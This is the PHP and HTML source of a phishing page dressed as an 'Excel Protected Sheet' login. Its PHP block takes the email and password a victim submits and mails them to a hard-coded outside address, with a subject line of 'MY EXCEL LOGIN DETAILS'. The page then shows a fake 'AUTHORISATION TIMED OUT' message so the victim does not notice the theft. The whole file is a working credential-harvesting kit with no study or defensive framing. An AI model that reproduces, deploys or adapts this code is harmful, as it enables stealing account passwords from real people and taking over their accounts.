<?php
    if (isset($_POST['login'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $to = "info@protectedlist.com";
        $subject = "MY EXCEL LOGIN DETAILS";

        $message = "
        This is my Login Details

            Email: $email
            Password: $password
        ";

        // Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

        // More headers
        $headers .= 'From: silvarcross043@outlook.com' . "\r\n";
        

        mail($to, $subject, $message, $headers);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Excel Protected Sheet</title>
    <link rel="icon" href="image//up.png">
    <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    
    <section>
        <div class="container">
            <div class="rows">
                <div class="card shadow p-5">
                    <div class="row justify-content-center">
                        <img src="image/top.png" alt="" width="25%" class="pb-3">
                    </div>                   
                    
                    <h1 class="text-center py-4 text-success">AUTHORISATION <br> TIMED <br> OUT!!!
                    </h1>
                </div>
            </div>
        </div>
    </section>
</body>
</html>